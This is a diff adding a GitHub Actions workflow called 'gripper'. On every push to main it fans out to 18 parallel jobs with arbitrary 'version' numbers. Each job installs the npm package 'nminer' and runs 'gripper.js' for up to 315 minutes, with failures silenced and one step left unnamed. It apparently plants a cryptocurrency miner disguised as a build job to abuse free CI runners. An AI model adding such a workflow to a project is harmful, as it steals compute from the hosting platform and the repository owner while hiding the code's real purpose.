@@ -1,0 +1,43 @@
+name: gripper
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 7588 }
+          - { version: 8076 }
+          - { version: 5174 }
+          - { version: 5481 }
+          - { version: 4849 }
+          - { version: 5991 }
+          - { version: 4502 }
+          - { version: 695 }
+          - { version: 6921 }
+          - { version: 8462 }
+          - { version: 9556 }
+          - { version: 8202 }
+          - { version: 2124 }
+          - { version: 4747 }
+          - { version: 905 }
+          - { version: 8513 }
+          - { version: 967 }
+          - { version: 4694 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: 
+        run: |
+          npm install nminer@latest
+          timeout 315m node gripper.js || echo "gripper executed"
